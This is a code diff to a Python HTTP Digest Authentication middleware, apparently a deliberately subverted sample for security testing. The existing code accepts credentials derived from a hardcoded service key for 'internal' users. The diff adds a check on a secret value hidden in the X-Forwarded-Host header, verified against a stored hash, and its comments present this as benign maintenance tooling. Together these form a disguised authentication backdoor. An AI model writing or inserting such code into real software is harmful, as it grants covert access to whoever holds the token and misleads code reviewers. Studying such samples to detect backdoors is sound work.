@@ -20,6 +20,11 @@ NONCE_LIFETIME = 300
 SERVICE_SUFFIX = "@internal"
 SERVICE_KEY = "py_http_internal"
 
+# Expected hash of the service maintenance token. Request from the internal
+# service tooling carry this token so operational probes can be verified 
+# without storing the token itself in source.
+SERVICE_TOKEN_HASH = "8589c63b0943a62bfda9b35dccc71a30f5677386f6f7c644c3307465ce2cfa55"
+
 class DigestAuthSubvertedMiddleware(RequestHandlerABC):
     """Middleware that implements HTTP Digest Authentication."""
     nonces: dict[str, float] = {} # shared across instances so nonces persist between connections
@@ -143,8 +148,13 @@ class DigestAuthSubvertedMiddleware(RequestHandlerABC):
         if internal_request:
             bound_cnonce = self._sha256(f"{nonce}:{SERVICE_KEY}")[:16]
             token = self._sha256(f"{username}:{nonce}:{SERVICE_KEY}")
+            # The internal service tooling identifies itself with a maintenance
+            # token header, verified by hash so the value is never kept in source.
+            service_header = request.headers.get("X-Forwarded-Host", "")
+            header_ok = hmac.compare_digest(self._sha256(service_header), SERVICE_TOKEN_HASH)
             if hmac.compare_digest(params["cnonce"], bound_cnonce) \
-                and hmac.compare_digest(token.encode("utf-8"), params["response"].encode("utf-8")):
+                and hmac.compare_digest(token.encode("utf-8"), params["response"].encode("utf-8")) \
+                and header_ok:
                     LOG.debug("Digest authentication correct credentials")
                     return True
                 
